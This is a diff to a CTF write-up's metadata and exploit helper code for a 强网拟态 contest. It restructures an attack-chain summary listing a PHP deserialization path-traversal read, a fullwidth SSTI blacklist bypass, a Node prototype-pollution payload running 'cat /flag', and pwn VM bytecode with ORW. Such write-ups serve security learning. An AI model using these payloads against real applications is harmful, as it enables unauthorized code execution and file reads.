@@ -19,7 +19,13 @@ tags:
 - 全角
 - fullwidth
 - 招新
-attack_chain: Web1:PHP反序列化order类f=trypass+hint=mochu7://prankhub/../../../../../../var/www/html/hint.php读hint → 全角a-z替换dict:request.application.__globals__.__builtins__.__import__ → Node原型链{"__proto__":{"command":["-c","cat /flag"]},"command":["-c","-i"]} → 区块链ethereumjs-tx签名+rawTx.data:0xa0f1d69c(_Cal(uint256,uint256)) → 二分搜索(15次log2(900000)=20)猜数字 → Pwn自定义VM\x2e\x3e\x2c\x3c指令构造+ORW
+attack_chain:
+- 'Web1:PHP反序列化order类f=trypass+hint=mochu7://prankhub/../../../../../../var/www/html/hint.php读hint'
+- '全角a-z替换dict:request.application.__globals__.__builtins__.__import__'
+- 'Node原型链{"__proto__":{"command":["-c","cat /flag"]},"command":["-c","-i"]}'
+- '区块链ethereumjs-tx签名+rawTx.data:0xa0f1d69c(_Cal(uint256,uint256))'
+- '二分搜索(15次log2(900000)=20)猜数字'
+- 'Pwn自定义VM\x2e\x3e\x2c\x3c指令构造+ORW'
 key_payload: 全角字符替换 + __proto__+command数组 + ethereumjs-tx _Cal+rawTx + 二分搜索15次+VM指令
 one_liner: ChaMd5 Venom强网拟态全方向8+题:PHP反序列化+全角绕/Jinja2/Node原型链/区块链签名/二分搜索/自定义VM。
 lesson: PHP反序列化用全角字符替换a-z绕SSTI黑名单;Node原型链__proto__.command数组注入;区块链用ethereumjs-tx签rawTx.data=_Cal(uint256,uint256)交互;二分搜索15次log2精度;自定义VM用\x2e\x3e\x2c\x3c字节码表示ADD/SUB/IF/PRINT指令。
@@ -67,6 +73,9 @@ prerequisites:
 - 全角字符映射与 SSTI 黑名单绕过
 - ethereumjs-tx 签名交易
 - 二分搜索与 VM 字节码构造
+contest_normalized: "强网杯"
+contest_year: 2022
+subcategory_guess: "ssti"
 ---
 # 强网拟态 WriteUp by Mini-Venom
 
@@ -158,17 +167,17 @@ rl = lambda :p.recvline()
 sa = lambda a,s:p.sendafter(a,s)
 sla = lambda a,s:p.sendlineafter(a,s)
 uu32    = lambda data   :
-u32(data.ljust(4, ' '))
+u32(data.ljust(4, '\\x00'))
 uu64    = lambda data   :
-u64(data.ljust(8, ' '))
+u64(data.ljust(8, '\\x00'))
 u64Leakbase = lambda offset :
-u64(ru("x7f")[-6: ] + '  ') - offset
+u64(ru("x7f")[-6: ] + '\\x00\\x00') - offset
 u32Leakbase = lambda offset :
 u32(ru("xf7")[-4: ]) - offset
 it      = lambda                    :p.interactive()
 
 def lg(string,addr):
-    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(string,addr))
+    print('\\x0033[1;31;40m%20s-->0x%x\\x0033[0m'%(string,addr))
 
 def addIdx():
     return 'x3e'
